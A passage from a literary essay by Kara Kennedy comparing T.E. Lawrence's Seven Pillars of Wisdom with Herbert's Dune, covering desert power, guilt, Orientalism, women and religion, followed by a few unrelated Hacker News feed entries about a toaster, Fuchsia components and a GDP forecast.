<p>Looking first at Lawrence, he admits early on that his book is not a history of the Arab movement but of himself in the movement. It is about his daily life and encounters with people, with the war providing a sense of purpose to structure the narrative. In short, this purpose is to convince enough Arab tribes to side with Prince Feisal against the Turks to defeat them. It means persuading the tribes to put aside their grudges and vendettas, and sometimes their ways of tribal justice, to form a cohesive front.</p>
<p>Lawrence already knows Arabic and how to wear the skirts and head-cloth of the Arab outfit, but he gains a deeper understanding of the language and culture through his experience traveling in the Middle East. For example, he discovers how important it is to have a broad knowledge of the various peoples who live in the desert if one wants to be accepted as an insider: “In the little-peopled desert every worshipful man knew every other; and instead of books they studied their generation. To have fallen short in such knowledge would have meant being branded either as ill-bred, or as a stranger; and strangers were not admitted to familiar intercourse or councils, or confidence.” [Lawrence, p 416-417*] He is used to book knowledge being valued. Now he must adjust to picking up information tidbits to gain the trust of new tribes and persuade them to his and Feisal’s cause.</p>
<p>In terms of clothing, Lawrence comes to accept the Arab dress as “convenient in such a climate” and blends in with his Arab companions by wearing it instead of the British officer uniform. [Lawrence, p 111] This reduces the sense that he is from a different culture and way of life. He learns the advantages of “going bare foot” to gain a better grip on tough terrain but also the pain of having no shoe protection in rocky or snowy terrain. [Lawrence, p 486] He writes of the incredulity of Egyptian and British military police in Cairo when he answers their questions in Arabic with fluent English: “They looked at my bare feet, white silk robes and gold head-rope and dagger…I was burned crimson and very haggard with travel. (Later I found my weight to be less than seven stone [44 kg/98 lb]).” [Lawrence, p 327-328] Here Lawrence paints a picture of himself as seen through their eyes—a scrawny, sunburned, barefoot leader dressed like an Arab but speaking English like a British person.</p>
<p>Sometimes his transformation leads to feelings of shame, showing Lawrence’s discomfort with the idea that he has ‘gone native.’ At the close of the book, once Damascus has been conquered, he has an unusual encounter with a medical major:</p>
<p>With a brow of disgust for my skirts and sandals he said, ‘You’re in charge?’ Modestly I smirked that in a way I was, and then he burst out, ‘Scandalous, disgraceful, outrageous, ought to be shot…’ At this onslaught I cackled out like a chicken, with the wild laughter of strain…I hooted out again, and he smacked me over the face and stalked off, leaving me more ashamed than angry, for in my heart I felt he was right, and that anyone who pushed through to success a rebellion of the weak against their masters must come out of it so stained in estimation that afterward nothing in the world would make him feel clean. However, it was nearly over. [Lawrence, p 682]</p>
<p>While the medical major is disgusted at Lawrence’s Arab appearance and thinks he has sullied himself, Lawrence seems to feel ashamed of having taken on this appearance as a way of manipulating the Arabs to rebel. He feels dirtied by his role but knows that his part in this performance is almost over.</p>
<p>The strategic advantage that Lawrence identifies is that the Arabs are on their own turf and can engage in guerilla-style attacks, then retreat into the desert with minimal casualties. Throughout <em>Seven Pillars</em>, Lawrence describes how he led small groups of men to sabotage the Turks’ transportation and communication networks by installing explosives in key parts of the railway such as bridges. Their ability to quickly maneuver on camels and disappear made them difficult targets to anticipate or defend against. He makes a comparison between this ‘desert power’ and naval power, which the British were very familiar with:</p>
<p>‘He who commands the sea is at great liberty, and may take as much or as little of the war as he will.’ And we commanded the desert. Camel raiding parties, self-contained like ships, might cruise confidently along the enemy’s cultivation-frontier, sure of an unhindered retreat into their desert-element which the Turks could not explore. [Lawrence, p 345]</p>
<p>As a fighting force, the camels were also formidable. Lawrence says that “a charge of ridden camels going nearly thirty miles an hour was irresistible.” [Lawrence, p 310] Another advantage was that the Arabs’ numbers were constantly in flux due to a reliance on a mixture of tribes rather than one main armed force. This meant “No spies could count us, either, since even ourselves had not the smallest idea of our strength at any given moment.” [Lawrence, p 390] Lawrence’s narrative shows his appreciation for this way of waging war and how much his thinking adapts in response to his new environment.</p>

<h4>Paul Muad’Dib</h4>
<p>How does this picture of Lawrence transformed into Lawrence of Arabia compare with the characterization of Paul Atreides in <em>Dune</em>?</p>
<p>Paul is also raised in a Western-like style yet able to adopt the ways of a foreign people with relative ease. He is curious about the “will-o’-the-sand people called Fremen” even before he moves from Caladan to Arrakis. [Herbert, p 5*] Once there, he relies on his training as the son of a duke and a Bene Gesserit to understand and adapt to the local culture.</p>
<p>Paul somehow knows how to properly fit a stillsuit on his first try, as if it were already natural to him. His knowledge and intelligence impress the Imperial Planetologist Dr. Liet Kynes, who believes Paul fits with the legend: “<em>He shall know your ways as though born to them</em>.” [Herbert, p 110] Compare this with a passage from <em>Seven Pillars</em>: “Now as it happened I had been educated in Syria before the war to wear the entire Arab outfit when necessary without strangeness, or sense of being socially compromised.” [Lawrence, p 111] Unlike Lawrence, Paul has the advantage of his growing prescience to give him special foreknowledge of how to adjust to his new environment, as well as a savior narrative to align with. But both are able to take on the garb of a different culture relatively smoothly.</p>
<p>Besides dress, their outward attitude toward the foreigners they find themselves among is similar. Lawrence states idealistically that “I meant to make a new nation, to restore a lost influence, to give twenty millions of Semites the foundation on which to build an inspired dream-palace of their national thoughts.” [Lawrence, p 23] Once among the Fremen, Paul is named Paul Muad’Dib and Usul and learns how to live according to their cultural norms and values. He presumes to help train and lead the Fremen so they can fight against their common enemy, the Harkonnen, and turn Arrakis into a water-filled paradise. But both figures admit that what they actually need is a fighting force. The promise of independence they hold out is thus a means to an end.</p>
<p>The idea of desert power in Lawrence’s story also appears in <em>Dune</em>. Duke Leto informs his son, Paul, of this shift in how to maintain control of their new planet. He tells Paul, “On Caladan, we ruled with sea and air power…Here, we must scrabble for desert power.” [Herbert, p 104] Later, Paul shows that he has accepted this as his own strategy: “Here, it’s <em>desert power</em>. The Fremen are the key.” [Herbert, p 204] Just as the Turks were constantly stymied by the Arab attacks on their equipment and forces, the Harkonnen find themselves with severe losses due to the Fremen raids. Their underestimation of the Fremen leaves them vulnerable. By the time they acknowledge that they have been losing five troops to every one Fremen, it is too late.</p>
<p>Herbert gives the Fremen on their sandworms a final dramatic military maneuver when they ride in to attack the Emperor after using atomics to blow open the Shield Wall. Just like the camels that Lawrence describes create an “irresistible” charge during battle, the sandworms handily plow through the Emperor’s forces in their surprise appearance.</p>
<p>Compare Lawrence’s description of the camel-mounted forces surrounding him at an honor march with Herbert’s scene:</p>
<blockquote>
<p>…the forces behind us swelled till there was a line of men and camels winding along the narrow pass towards the watershed for as far back as the eye reached…behind them again the wild mass of twelve hundred bouncing camels of the bodyguard, packed as closely as they could move, the men in every variety of coloured clothes and the camels nearly as brilliant in their trappings. We filled the valley to its banks with our flashing stream. [Lawrence, p 144-145]</p>
<p>Out of the sand haze came an orderly mass of flashing shapes—great rising curves with crystal spokes that resolved into the gaping mouths of sandworms, a massed wall of them, each with troops of Fremen riding to the attack. They came in a hissing wedge, robes whipping in the wind as they cut through the melee on the plain. [Herbert, p 464]</p>
</blockquote>
<p>Both passages give a sense of the magnitude of these mounted forces prepared to do battle. They even use similar imagery: a “flashing stream” and “flashing shapes,” a “wild mass” and “a massed wall.” To any enemy who had discounted the desert dwellers as merely a pest, these mounted forces prove the error in that assumption.</p>
<p>Like Lawrence, by bringing new insights, training, and “skilled assistance,” Paul aids local efforts to achieve victory. [Lawrence, p 113] He also holds a more expansive vision of what can be achieved, and acts as a bridge between the worlds of the Fremen and the Imperium. This is how Paul becomes a Lawrence of Arabia figure, and the clear parallels between the desert in Dune and the Middle East only add to this sense.</p>

<h4>Differing Emotions</h4>
<p>Despite their similarities, Lawrence appears much more conflicted than Paul about his role in adopting the ways of a foreign people and assuming such great authority over them. His anxiety is peppered throughout <em>Seven Pillars</em> as he describes his attempt to inhabit two worlds.</p>

<h4>A Conflicted Man</h4>
<p>Lawrence admits that he is unprepared for the large role he is given in the Middle East during WWI, but out of duty or other reasons he stays the course. He says, “I was unfortunately as much in command of the campaign as I pleased, and was untrained.” [Lawrence, p 193] When he is told to return to Arabia and Feisal after believing he was done in the region, he notes that this task goes against his grain—he is completely unfit for the job, he hates responsibility, and he is not good with persuading people. His only knowledge of soldiering is as a student at Oxford reading books about Napoleon’s campaigns and Hannibal’s tactics. Yet he is still forced to go and “take up a role for which I felt no inclination.” [Lawrence, p 117]</p>
<p>Deeper into the 700-page memoir, Lawrence writes more specifically and frequently about feeling like a fraud and trying to serve two masters. He foreshadows his conflictions early on, believing that “In my case, the effort for these years to live in the dress of Arabs, and to imitate their mental foundation, quitted me of my English self, and let me look at the West and its conventions with new eyes: they destroyed it all for me. At the same time I could not sincerely take on the Arab skin: it was an affectation only.” [Lawrence, p 30]</p>
<p>Although he gains a new perspective on his own culture, he acknowledges that his role was part of a performance. He knows that “I must take up again my mantle of fraud in the East…It might be fraud or it might be farce: no one should say that I could not play it.” [Lawrence, p 515] This means having to present different faces to the British and the Arabs, and he knows the latter will necessarily suffer in the face of the former’s might. He says, “Not for the first or last time service to two masters irked me… Yet I could not explain to Allenby the whole Arab situation, nor disclose the full British plan to Feisal… Of course, we were fighting for an Allied victory, and since the English were the leading partners, the Arabs would have, in the last resort, to be sacrificed for them. But was it the last resort?” [Lawrence, p 395] In one instance, he feels homesick and like an outcast among the Arabs, someone who has “exploited their highest ideals and made their love of freedom one more tool to help England win.” [Lawrence, p 560]</p>
<p>The words he uses paint a dismal picture of his complicity in winning the Arabs’ trust. He believes that “I was raising the Arabs on false pretenses, and exercising a false authority over my dupes” and that “the war seemed as great a folly as my sham leadership a crime.” [Lawrence, p 387] Again he calls them “our dupes, wholeheartedly fighting the enemy” but still the “bravest, simplest and merriest of men.” [Lawrence, p 566]</p>
<figure id="attachment_647169" aria-describedby="caption-attachment-647169"><img decoding="async" src="https://reactormag.com/wp-content/uploads/2021/05/Feisal-Lawrence-at-Versailles-740x555.jpg" alt="" width="740" height="555" srcset="https://reactormag.com/wp-content/uploads/2021/05/Feisal-Lawrence-at-Versailles-740x555.jpg 740w, https://reactormag.com/wp-content/uploads/2021/05/Feisal-Lawrence-at-Versailles-140x105.jpg 140w, https://reactormag.com/wp-content/uploads/2021/05/Feisal-Lawrence-at-Versailles-768x576.jpg 768w, https://reactormag.com/wp-content/uploads/2021/05/Feisal-Lawrence-at-Versailles.jpg 1024w" sizes="(max-width: 740px) 100vw, 740px"><figcaption id="caption-attachment-647169">Prince Feisal (front, center) and T.E. Lawrence (right of Feisal) at Paris Peace Conference in 1919</figcaption></figure>
<p>It especially seems to bother him that he is a foreigner—from a large colonial power, no less—preaching to them about the need for national freedom. He states, “When necessary, I had done my share of proselytizing fatigues, converting as best I could; conscious all the time of my strangeness, and of the incongruity of an alien’s advocating national liberty.” [Lawrence, p 458] He calls himself “the stranger, the godless fraud inspiring an alien nationality” who hopes “to lead the national uprising of another race, the daily posturing in alien dress, preaching in alien speech.” [Lawrence, p 564, 514]</p>
<p>Such feelings prey on his mind and make him fearful of being left with his thoughts: “My will had gone and I feared to be alone, lest the winds of circumstance, or power, or lust, blow my empty soul away.” [Lawrence, p 514] He also suspects that there must be something in him that enabled such a duplicitous performance: “I must have had some tendency, some aptitude, for deceit, or I would not have deceived men so well, and persisted two years in bringing to success a deceit which others had framed and set afoot…Suffice it that since the march to Akaba I bitterly repented my entanglement in the movement, with a bitterness sufficient to corrode my inactive hours, but insufficient to make me cut myself clear of it.” [Lawrence, p 569]</p>
<p>But Lawrence still finds himself craving a good reputation among others and feeling guilty that he of all people should have one. He sees that “Here were the Arabs believing me, Allenby and Clayton trusting me, my bodyguard dying for me: and I began to wonder if all established reputations were founded, like mine, on fraud.” [Lawrence, p 579]</p>

<h4>A Confident Man</h4>
<p>The reflections on fraudulence and guilt in Lawrence’s book stand out as aspects that are mostly absent in the characterization of Paul in <em>Dune</em>. Paul does have some fears about his ability to prevent the jihad he foresees. But he appears fully able to reconcile his position as a duke in exile with his position as a leader among the Fremen who supposedly has their interests at heart. In comparison to Lawrence, Paul appears overly confident and unbothered by his use of foreign forces to gain authority and territorial rule.</p>
<p>As discussed above, Paul is explicitly told by his father about the importance of desert power. He seems to think his status entitles him to not only secure safety and survival among the Fremen, but to convince them to sacrifice themselves to help him reclaim his House’s ruling authority. And his plan is made even smoother by the fact that the way has already been paved by the Bene Gesserit’s Missionaria Protectiva for him to be accepted as a messiah figure.</p>
<p>Despite Paul seeing the likelihood of a terrible jihad waged by a combination of Atreides forces and Fremen warriors, there is little indication of an effort to take a different path. Paul describes how he “suddenly saw how fertile was the ground into which he had fallen, and with this realization, the terrible purpose filled him.” [Herbert, p 199] He foresees a path with “peaks of violence…a warrior religion there, a fire spreading across the universe with the Atreides green and black banner waving at the head of fanatic legions drunk on spice liquor.” [Herbert, p 199] He even seems to blame the Fremen for this at times. For example, he feels that “this Fremen world was fishing for him, trying to snare him in its ways. And he knew what lay in that snare—the wild jihad, the religious war he felt he should avoid at any cost.” [Herbert, p 346-347]</p>
<p>Somewhat arrogantly, he believes that he is the only one who can prevent this from happening. On the day of his sandworm riding test, “Half pridefully, Paul thought: <em>I cannot do the simplest thing without its becoming a legend…every move I make this day. Live or die, it is a legend. I must not die. Then it will be only legend and nothing to stop the jihad</em>.” [Herbert, p 388] On seeing the Fremen leader Stilgar transformed into “a receptacle for awe and obedience” toward him, Paul tells himself, “<em>They sense that I must take the throne…But they cannot know I do it to prevent the jihad</em>.” [Herbert, p 469]</p>
<p>Yet he, along with his mother, are the ones who train the Fremen to become even more skilled warriors, and he invites them to defeat not only the Harkonnen but the Emperor himself. Thus, Paul conveniently overlooks his own actions which directly contribute to this outbreak of violence across the universe. It is only toward the end of the book that he recognizes his role: “And Paul saw how futile were any efforts of his to change any smallest bit of this. He had thought to oppose the jihad within himself, but the jihad would be. His legions would rage out from Arrakis even without him. They needed only the legend he already had become. He had shown them the way.” [Herbert, p 482]</p>
<p>Whereas Lawrence reveals increased feelings of guilt during his time among the Arabs, Paul appears more and more confident, buoyed by his prescient abilities and victories over his enemies. And although both <em>Seven Pillars of Wisdom </em>and <em>Dune </em>have arguably successful endings for the peoples that have received external assistance, there is a sense that Lawrence is relieved that he can relinquish his position of authority, while Paul is triumphant at his rising power. He also displays his sense of ownership and control over the Fremen as a people, unequivocally stating that “The Fremen are mine.” [Herbert, p 489]</p>
<p>This represents a clear difference between these two men and how they process responsibility and authority. Paul is indeed a Lawrence of Arabia-type character, but appears to be absolved of the sense of fraudulence and guilt that Lawrence returns to again and again in his reflections.</p>

<h4>Orientalizing Tendencies</h4>
<p>There are also differences in Lawrence’s account of the Arabs as compared to Paul’s understanding of the Fremen. Although both use stereotypes, Lawrence’s descriptions have a greater tendency to contain Orientalist attitudes about non-Western cultures.</p>
<p>In brief, according to the famous Palestinian American academic Edward Said, Orientalism refers to the way that Westerners have historically set up a distinction between East and West, Orient and Occident, without acknowledging that this is a human-created construct that strengthens the power of the West. [<em>Orientalism</em>, Vintage, (first ed 1978) 2003] This perpetuates the idea that the West is superior to the East and reinforces stereotypes about who is civilized and who is human. In an Orientalist perspective, there is an “absolute and systematic difference between the West, which is rational, developed, humane, superior, and the Orient, which is aberrant, undeveloped, inferior.” [Said, p 300]</p>
<p>Said’s theory has been widely used in academic circles to analyze concepts such as imperialism, colonialization, and racism. It is also used as a lens to analyze cultural products like books, films, and advertising. Because Said specifically focuses on the Middle East and depictions of Arabs in his work, it is particularly useful in examining texts related to these.</p>

<h4>The Arabs</h4>
<p>Having spent extended periods of time living with various Arab groups, Lawrence is able to move past some stereotypes. As discussed above, there are certainly aspects of the Arabs that he finds beneficial. Although the living conditions can be difficult, he displays a certain amount of respect for the way the nomads, in particular, have carved out a living through use of dress, camels, wells, and other adaptations to the landscape and climate. He himself adopts their ways and language and communicates with them about complex military operations.</p>
<p>Certain men he describes favorably, such as Prince Feisal: “In appearance he was tall, graceful and vigorous, with the most beautiful gait, and a royal dignity of head and shoulders.” [Lawrence, p 98] Another leader he characterizes with less positive language: “Nuri, the hard, silent, cynical old man, held the tribe between his fingers like a tool.” [Lawrence, p 641]</p>
<p>Lawrence is more neutral in tone about his observations regarding how the Arabs organize themselves. He portrays the tribal structure and lack of hierarchy as somewhat of a double-edged sword. On the one hand, society is more egalitarian and “there were no distinctions, traditional or natural.” [Lawrence, p 161] This means that a leader must earn their position through merit and share the experiences of living and eating with those in their ranks.</p>
<p>On the other hand, it means that they are less likely to form the kind of large, disciplined armies that nations like Britain use for conquest and control. Lawrence explains how it takes Feisal two years to settle all of the blood feuds in the region so that different tribes can unite in war against the Turks. Because their “idea of nationality was the independence of clans and villages,” it is more challenging to ask them to view themselves as part of an Arab nation. [Lawrence, p 103]</p>
<p>Lawrence’s descriptions of the Arabs as a people show the type of Orientalist tendencies that Said criticizes. Lawrence claims that they are a simple people, willing believers, and undisciplined fighters who need leadership and guidance to harness their potential. He also sometimes uses the language of savagery, perhaps in an attempt to differentiate himself, whom he considers a civilized Englishman, from the tribesmen.</p>
<p>In his observations, it is clear he is using his own culture as a reference point: “They were a dogmatic people, despising doubt, our modern crown of thorns. They did not understand our metaphysical difficulties, our introspective questionings. They knew only truth and untruth, belief and unbelief, without our hesitating retinue of finer shades…they were a limited, narrow-minded people.” [Lawrence, p 36]</p>
<p>Yet their minds are fully open to belief and obedience, according to Lawrence. One of his pieces of evidence is that three of the great world religions (Judaism, Christianity, Islam) arose out of this region and found ways of prospering among the people.</p>
<p>His opinion is that “Arabs could be swung on an idea as on a cord; for the unpledged allegiance of their minds made them obedient servants. None of them would escape the bond till success had come, and with it responsibility and duty and engagements…Their mind was strange and dark, full of depressions and exaltations, lacking in rule, but with more of ardour and more fertile in belief than any other in the world.” [Lawrence, p 41]</p>
<p>Lawrence sees this characteristic of obedience as full of potential, but only if it can be used to establish discipline. He describes how the Arabs perform well in small units but “[i]n mass they were not formidable, since they had no corporate spirit, nor discipline nor mutual confidence.” [Lawrence, p 140] After “spartan exercises” and training, though, they can become “excellent soldiers, instantly obedient and capable of formal attack.” [Lawrence, p 141] The goal appears to be to use the men’s usual fighting style for guerilla attacks when needed, but also train them to be able to fight in a more formal style that will help the Allies.</p>

<h4>The Fremen</h4>
<p>There are certainly several general parallels between the cultures of the Arabs and the Fremen. A strong Arabic influence appears in <em>Dune </em>through the use of Arab history, topography, culture, and words. Herbert borrows substantially from Arabic with terms such as Muad’Dib, Usul, Lisan Al-Gaib, Sayyadina, Shari-a, and Shaitan. [Istvan Csicsery-Ronay Jr, <em>Seven Beauties of Science Fiction</em>, Wesleyan University Press, 2008, p 39; Karin Christina Ryding, “The Arabic of <em>Dune</em>: Language and Landscape,” In <em>Language in Place: Stylistic Perspectives on Landscape, Place and Environment</em>, edited by Daniela Francesca Virdis, Elisabetta Zurru, and Ernestine Lahey, John Benjamins Publishing, 2021]</p>
<p>Critics have pointed to an analogy between the Fremen and Bedouin Arabs due to their cultures being nomadic, using guerilla war tactics, and having to live in harmony with nature out of necessity. [Csicsery-Ronay; B. Herbert; O’Reilly] In addition, the camel and sandworm are both used for transportation, warfare, and economic and cultural needs. [Hoda M. Zaki, “Orientalism in Science Fiction.” In <em>Food for Our Grandmothers: Writings by Arab-American and Arab-Canadian Feminists</em>, edited by Joanna Kadi, South End Press, 1994, p 182]</p>
<p>The overall characterization of the Fremen may be considered an overly romantic vision of Arab Bedouin society: long, flowing robes and dark or tanned skin; the practice of polygamy; values such as honor, trust, and bravery; and tribes that live primitive and simple lives in response to a brutal environment. [Zaki, p 183]</p>
<p>The representation of desert peoples through the Atreides’ eyes does rely on some romanticized notions. However, it can be seen as relying on fewer negative stereotypes than the depiction of the Arabs in Lawrence’s book.</p>
<p>In the Atreides’ view, the Fremen appear at first to be a suspicious and cautious people, willing to see if they can work with the Atreides or if they will need to consider them hostile like the Harkonnen. In the meantime, the Fremen helpfully provide solid intelligence and gifts of value such as stillsuits. Following his father, Paul accepts the view that the Fremen could be the allies and ‘desert power’ that they need. He thus has a clear incentive to look upon them favorably, just as Lawrence does.</p>
<p>When he sees the Fremen Stilgar for the first time, he feels the leader’s commanding presence: “A tall, robed figure stood in the door…A light tan robe completely enveloped the man except for a gap in the hood and black veil that exposed eyes of total blue—no white in them at all…In the waiting silence, Paul studied the man, sensing the aura of power that radiated from him. He was a leader—a <em>Fremen</em> leader.” [Herbert, p 92] Stilgar brings with him a sense of authority that all recognize. This aligns with how Lawrence describes Feisal—with a sense of destiny: “I felt at first glance that this was the man I had come to Arabia to seek – the leader who would bring the Arab Revolt to full glory. Feisal looked very tall and pillar-like, very slender, in his long white silk robes and his brown head-cloth bound with a brilliant scarlet and gold cord.” [Lawrence, p 92]</p>
<p>Also similar to Lawrence, Paul comes to understand and respect the way the Fremen have made the harsh environment livable through their stillsuits, sandworm riding, and other adaptations. When he realizes that the Fremen do not fear the desert because they know how to “<em>outwit the worm</em>”, he is impressed. [Herbert, p 125]</p>
<p>He notes the difference between his world—heavily regulated by the faufreluches class system—and that of the Fremen, who “lived at the desert edge without caid or bashar to command them” and were not recorded in Imperial censuses. [Herbert, p 4-5] Like Lawrence, he appears not to mind his experience living in a tribal structure, though both men still enjoy a certain privilege as outsiders. He learns how to ride sandworms, just as Lawrence learns how to ride camels.</p>
<p>Along with his mother, Jessica, Paul finds success in teaching Fremen fighters how to engage in more effective attacks against the Harkonnen. Jessica realizes that “<em>The little raids, the certain raids—these are no longer enough now that Paul and I have trained them. They feel their power. They want to fight.</em>” [Herbert, p 399]</p>
<p>Yet the concept of these desert peoples being simple-minded and willing to believe anything is also present in <em>Dune</em>. Fremen society has been sown with the myths and legends of the Bene Gesserit’s Missionaria Protectiva, which primes them to accept Jessica and Paul as savior figures without much question. Jessica knowingly capitalizes on these legends to solidify her and Paul’s status, and Paul is pulled along into the mythos.</p>
<p>In comparison to these two rational-seeming figures, the Fremen can appear superstitious and trapped in their traditional ways. Their minds seem especially open to belief and obedience, in a way similar to how Lawrence describes the Arabs.</p>
<p>Arguably this is part of Herbert’s study of religions and his critique of people’s willingness to follow religious leaders and their promises: The Missionaria Protectiva goes out to many planets and populations, not just the Fremen. But the Orientalist overtones remain an inescapable part of the Fremen’s characterization, with ‘enlightened’ leaders needing to come to assist supposedly ‘inferior’ native peoples. The Fremen as a whole shift from independent tribal groups to commando forces operating under Paul’s guidance and religious authority. No matter how independent and authoritative Stilgar is initially, he too comes to believe in the legend and defers to Paul.</p>
<p>However, it is significant that the main characters themselves essentially <em>become </em>Fremen, even though this is out of necessity and somewhat exploitative. Just like Lawrence sees some of the Arabs’ ways as beneficial and chooses to adopt them, Paul and Jessica see the value of the Fremen’s ways in the desert environment and adopt them. They learn the water discipline necessary for desert survival. Jessica becomes a Fremen Reverend Mother and thus a key keeper of memory and advisor for the tribe. Paul accepts the mantle of messiah, new names, and a Fremen woman, Chani, as his concubine.</p>
<p>Basically, they both accept a hybrid identity as the new norm for their lives—a type of uniting of West and East that helps them defeat their mutual enemies. [Kara Kennedy, “<a href="https://www.researchgate.net/publication/303317810_Epic_World-Building_Names_and_Cultures_in_Dune">Epic World-Building: Names and Cultures in <em>Dune</em></a>” <em>Names</em>, vol. 64, no. 2, p 106] This adds more dimension and nuance to the depiction of the Fremen and their culture, preventing it from relying solely on Orientalist stereotypes. And unlike Lawrence, who eventually returns to England, Paul remains close to the desert environment and influenced by Fremen in his role as ruler.</p>
<h4>Women and Religion</h4>

<p>There are two other notable differences between the worlds of <em>Seven Pillars </em>and <em>Dune</em>. One is the portrayal of women.</p>
<p>Lawrence’s book is clearly positioned as a man’s story about a male domain (war) likely intended for a male audience, and there are only a few mentions of women in total. Lawrence makes some brief reflections about the lack of women, but this mainly seems to be so that he can comment on the effect the absence has on men. He says the Arab leaders rely on their instinct and intuition and “Like women, they understood and judged quickly, effortlessly.” [Lawrence, p 221] He attributes this to “the Oriental exclusion of woman from politics”—that men end up taking on both so-called masculine and feminine characteristics in women’s absence. [Lawrence, p 221] He notes that “from end to end of it there was nothing female in the Arab movement, but the camels.” [Lawrence, p 221]</p>
<p>In contrast, women are very much present throughout <em>Dune</em>. A woman opens not only the book itself, but each unnumbered chapter within. This is the voice of Princess Irulan, the Emperor’s daughter, who authors the epigraphs and enters as a character at the book’s close. Irulan’s role is significant for shaping how the reader interprets each chapter. Her writings foreshadow key points and add to the sense that certain events are destined to happen.</p>
<p>Jessica appears so often she can be considered a main character alongside Paul. Being one of the Bene Gesserit, she is a highly skilled woman who takes responsibility for training and guiding her son, and securing their safety and survival as outsiders among the Fremen.</p>
<p>Chani is the child of Planetologist Liet Kynes and a Fremen woman and is introduced as a fierce fighter in Stilgar’s group that travels as a military company.</p>
<p>There is certainly no equivalent to these women in Lawrence’s book (or the 1962 film, which has no speaking roles for women in its 227-minute running time). Any comparisons between Paul and Lawrence of Arabia should acknowledge that Paul is not the kind of solitary hero that Lawrence is often held up to be.</p>
<p>The second major difference between the texts is in the portrayal of religion.</p>
<p>In <em>Seven Pillars </em>it is nearly absent. In a book so focused on the Middle East and its people and politics, one might expect some discussion of Islam and religious practices. But as Lawrence explains it, religion is not a major factor in the war the Arabs are fighting since their enemies, the Turks, are also Muslim. He says that “Of religious fanaticism there was little trace”, implying that religion would not be a helpful motivation for the Arabs in their alliance with Allied forces. [Lawrence, p 103]</p>
<p>Meanwhile, <em>Dune </em>is saturated with references to a variety of religions, including Catholicism, Islam, and Buddhism. Paul quotes the Orange Catholic Bible and receives a miniature copy of one. Jessica employs religious incantations from the Missionaria Protectiva to fit the mold of a prophesied figure, and also helps Paul capitalize on these myths. “Appendix II: The Religion of Dune” provides more background information on the different religious currents in the universe and is interwoven with references to real-world religions.</p>
<p>All of these references to and critiques of religion make it a significant aspect of the book. This fits with Herbert’s interest in exploring the nature of the desert environment, and specifically what has caused it to give birth to so many major religions and loyal followers. It also aligns with his warnings about the danger of superhero figures, who he believes are “disastrous for humankind.” [Frank Herbert, “Dangers of the Superhero,” In <em>The Maker of Dune</em>, edited by Tim O’Reilly, Berkley Books, 1987, p 97]</p>

<h4>Conclusion</h4>
<p>In examining Lawrence’s <em>Seven Pillars of Wisdom </em>as a source of inspiration for Herbert’s <em>Dune</em>, we’ve seen that there are multiple similarities, but also significant differences between the two works. T.E. Lawrence and Paul Atreides have much in common, yet while Lawrence expresses his sense of feeling like an unprepared fraud, Paul is bolstered by his training and status to feel much more confident in his leadership. The Arabs and Bedouin tribes are indeed an inspiration for the characterization of the Fremen, and Paul has a more favorable attitude toward desert peoples than Lawrence, who exhibits more overt Orientalizing tendencies. And finally, <em>Dune </em>is much more concerned with including a variety of religious references and a positive portrayal of women than Lawrence, who excludes these aspects almost entirely.</p>
<p>What all this shows is that <em>Dune </em>is not in fact a copy of the story of Lawrence of Arabia with some science-fictional window dressing. Rather, it uses elements of Lawrence’s story and his unique perspective as key ingredients with which to create a new and fascinating world.</p>

<p>Note: Page numbers for <em>Seven Pillars of Wisdom: A Triumph </em>are from the Alden Press 1946 edition and for <em>Dune </em>the Berkley Books 1984 edition.</p>
<p>Kara Kennedy, PhD, is a researcher and writer in the areas of science fiction, digital literacy, and writing. She has published academic articles on world-building in the <em>Dune </em>series and has other works about the series forthcoming. She posts literary analyses of <em>Dune</em> for a mainstream audience on her blog at <a href="https://dunescholar.com/">DuneScholar.com</a>.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Repairable Flatpack Toaster (709 pts)]]></title>
            <link>https://www.kaseyhou.com/#/repairable-flatpack-toaster/</link>
            <guid>43246892</guid>
            <pubDate>Mon, 03 Mar 2025 21:19:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.kaseyhou.com/#/repairable-flatpack-toaster/">https://www.kaseyhou.com/#/repairable-flatpack-toaster/</a>, See on <a href="https://news.ycombinator.com/item?id=43246892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div href="/repairable-flatpack-toaster/">
            <div><div><p><img src="https://images.squarespace-cdn.com/content/v1/592869fe725e258ed3620a39/1499890990440-KXLZ5Z829FFFH3K0FZG0/DSC_3406+2.jpg?format=500w" data-src="https://images.squarespace-cdn.com/content/v1/592869fe725e258ed3620a39/1499890990440-KXLZ5Z829FFFH3K0FZG0/DSC_3406+2.jpg" data-image="https://images.squarespace-cdn.com/content/v1/592869fe725e258ed3620a39/1499890990440-KXLZ5Z829FFFH3K0FZG0/DSC_3406+2.jpg" alt="DSC_3406 2.jpg"></p></div><p>0</p></div>
            <p>Repairable Flatpack Toaster</p>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Comparing Fuchsia components and Linux containers [video] (203 pts)]]></title>
            <link>https://fosdem.org/2025/schedule/event/fosdem-2025-5381-comparing-fuchsia-components-and-linux-containers/</link>
            <guid>43246703</guid>
            <pubDate>Mon, 03 Mar 2025 21:06:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fosdem.org/2025/schedule/event/fosdem-2025-5381-comparing-fuchsia-components-and-linux-containers/">https://fosdem.org/2025/schedule/event/fosdem-2025-5381-comparing-fuchsia-components-and-linux-containers/</a>, See on <a href="https://news.ycombinator.com/item?id=43246703">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><a href="https://fuchsia.dev/">Fuchsia</a> is a new (non-Linux) operating system from Google, and one of the key pieces of Fuchsia's design is <a href="https://fuchsia.dev/fuchsia-src/concepts/components/v2/introduction?hl=en">the component framework</a>. Components on Fuchsia have many similarities with some of the container solutions on Linux (such as Docker): they both fetch content addressed blobs from the network, assemble those blobs into an isolated filesystem structure that holds all the dependencies necessary to run some piece of software, and launch namespaced processes with that created directory as its root.</p>
<p>The most interesting details are where these two projects diverge. Both have different use cases and requirements, which leads to different strengths between the systems. This talk will largely be focusing on where and why these two similar technologies diverge.</p>
<p>Relevant links:
- <a href="https://fuchsia.googlesource.com/fuchsia/">Fuchsia's source code</a>
- <a href="https://fuchsia-review.googlesource.com/">Fuchsia's code review</a>
- <a href="https://fuchsia.dev/fuchsia-src/get-started/learn-fuchsia">Getting started page</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Atlanta Fed predicts -2.8% GDP (215 pts)]]></title>
            <link>https://www.atlantafed.org/cqer/research/gdpnow</link>
            <guid>43246371</guid>
            <pubDate>Mon, 03 Mar 2025 20:35:31 GMT</pubDate>
